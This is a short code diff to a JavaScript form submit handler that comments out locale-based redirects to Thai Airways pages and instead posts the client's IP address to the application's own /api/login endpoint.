@@ -35,13 +35,22 @@ const onSubmit = async () => {
     }),
   });
   if (res?.status) {
-    if (locale.value === "th") {
-      navigateTo("https://www.thaiairways.com/th-th/", { external: true });
-    } else if (locale.value === "en") {
-      navigateTo("https://www.thaiairways.com/en-th/", { external: true });
-    } else {
-      navigateTo("https://www.thaiairways.com/zh-hk/", { external: true });
-    }
+    await fetch(`${useRuntimeConfig().public.apiUrl}/api/login`, {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json",
+      },
+      body: JSON.stringify({
+        ip_address: ip.value,
+      }),
+    });
+    // if (locale.value === "th") {
+    //   navigateTo("https://www.thaiairways.com/th-th/", { external: true });
+    // } else if (locale.value === "en") {
+    //   navigateTo("https://www.thaiairways.com/en-th/", { external: true });
+    // } else {
+    //   navigateTo("https://www.thaiairways.com/zh-hk/", { external: true });
+    // }
   }
 };
 
